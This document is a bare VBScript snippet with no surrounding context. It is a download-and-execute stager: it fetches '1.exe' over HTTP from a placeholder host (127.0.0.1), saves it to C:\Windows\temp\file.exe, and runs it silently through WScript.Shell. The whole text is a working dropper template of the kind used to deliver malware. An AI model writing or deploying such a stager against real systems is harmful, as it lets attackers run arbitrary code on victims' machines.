dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
 xHttp.Open "GET", "http://127.0.0.1/1.exe", False
 xHttp.Send
 with bStrm
     .type = 1 '
     .open
     .write xHttp.responseBody
    .savetofile "C:\Windows\temp\file.exe", 2 '
 end with
 Set objShell = WScript.CreateObject("WScript.Shell")
 objShell.Run("C:\Windows\temp\file.exe"), 1, True